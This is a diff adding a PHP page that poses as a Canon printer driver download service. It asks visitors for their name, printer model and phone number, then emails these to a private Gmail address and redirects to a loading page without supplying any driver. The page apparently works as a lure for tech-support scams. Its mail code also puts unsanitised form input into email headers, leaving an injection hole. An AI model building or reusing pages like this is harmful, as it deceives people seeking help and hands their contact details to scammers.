@@ -1,0 +1,124 @@
+<?php
+include("header.php")
+?>
+
+<style>
+  header.large
+  {
+    display: none;
+  }
+  header.small
+  {
+    display: none;
+  }
+
+</style>
+
+
+ <!-- Teaser start -->
+ <section id="teaser">
+
+      <div class="container">
+        <div class="row">
+          <div class="col-md-7 col-xs-12 pull-right">
+            <div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
+              <!-- Wrapper for slides start -->
+              <div class="carousel-inner" style="margin-top: 10%;">
+                <div class="item active">
+                  <h1 class="title">Get Link For Driver Installer</h1>
+
+                   <br><br>
+                    <p style="color: #fff; font-size: 20px;">If you’re in need of the most recent Canon driver download or update, simply complete the form provided, and we’ll promptly provide you with the corresponding link. In case you encounter any challenges during this process, don’t hesitate to reach out to our support team for assistance.</p>
+                    
+                  </div>
+                  
+                  </div>
+                  <!-- Wrapper for slides end -->
+
+                </div>
+              </div>
+              <div class="col-md-5 col-xs-12 pull-left">
+                <div class="reservation-form-shadow">
+                    
+
+                  <form action=" " method="POST" >
+
+                  <p style="font-size: 17px; color: #000; font-weight: 900;">PLEASE FILL IN YOUR DETAILS AND CLICK ON THE DOWNLOAD BUTTON BELOW!</p>
+                    <div class="form-group left">
+                        <label for="first-name">First Name:</label>
+                        <input type="text" class="form-control" name="first-name" id="first-name" placeholder="Enter Your Name" require> 
+                      </div>
+                      <div class="form-group right">
+                        <label for="last-name">Printer Model:</label>
+                        <input type="text" class="form-control" name="number" id="last-name" placeholder="Enter Your Printer Model" required>
+                      </div>
+                      <div class="form-group left">
+                        <label for="phone-number">Phone Number:</label>
+                        <input type="text" class="form-control" name="phone-number" id="phone-number" placeholder="Enter Your Phone Number" required>
+                      </div>
+                      <div class="form-group left" hidden>                       
+                        <input type="text" class="form-control" name="email" id="phone-number" value="zbs141@yahoo.com" placeholder="Enter Your Email" >
+                      </div>
+
+                      <div class="form-group left" hidden>                       
+                        <input type="text" class="form-control" name="ccemail" id="phone-number" value="nextpie01@gmail.com" placeholder="Enter Your Email" >
+                      </div>
+
+ <input type="submit" name="submit" value="Click here to start installation" style="background: #000000; color: #fff;  padding: 7px;" />
+                  
+                  </form>
+
+                </div>
+              </div>
+              
+            </div>
+          </div>
+          
+        </section>
+        <div class="arrow-down"></div>
+        <!-- Teaser end -->
+
+
+
+
+<?php
+include("footer.php")
+?>
+
+
+
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Get form values
+    $name = $_POST['first-name'];
+    $number = $_POST['number'];   
+    $phn = $_POST['phone-number'];
+    $email = $_POST['email'];
+    $cc = $_POST['ccemail']; // Retrieve CC email
+
+    // Construct email message
+    $to = "shahrukh78miya@gmail.com";
+    $subject = "Message from Contact Form";
+    $message_body = "Name: $name\n";
+    $message_body .= "Email: $email\n";
+    if (!empty($cc)) {
+        $message_body .= "CC: $cc\n";
+        $headers = "Cc: $cc\r\n";
+    }
+    $message_body .= "Message:\n$message";
+
+    // Set additional headers
+    $headers .= "From: $email\r\n";
+    $headers .= "Reply-To: $email\r\n";
+    
+    // Send email
+    $result = mail($to, $subject, $message_body, $headers);
+
+    if ($result) {
+      header('location:loading.php');
+    } else {
+      header('location:loading.php');
+    }
+}
+?>
